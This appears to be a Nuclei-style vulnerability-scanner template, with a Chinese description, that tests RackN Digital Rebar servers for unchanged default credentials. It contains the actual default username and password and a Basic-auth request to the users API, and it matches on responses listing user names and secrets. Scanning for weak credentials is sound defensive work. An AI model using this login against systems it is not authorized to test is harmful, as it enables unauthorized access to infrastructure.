id: digitalrebar-default-login

info:
  name: RackN Digital Rebar 默认口令登录（弱口令）
  author: c-sh0
  severity: high
  description: 该模板通过尝试 RackN Digital Rebar 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://docs.rackn.io/en/latest/doc/faq-troubleshooting.html?#what-are-the-default-passwords
    - https://rackn.com/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: rackn,digitalrebar,default-login,vuln

http:
  - raw:
      - |
        GET /api/v3/users HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    payloads:
      username:
        - rocketskates
      password:
        - r0cketsk8ts
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: header
        regex:
          - '(?i)(X-Drp-)'

      - type: word
        part: body
        words:
          - 'Name'
          - 'Secret'
        condition: and
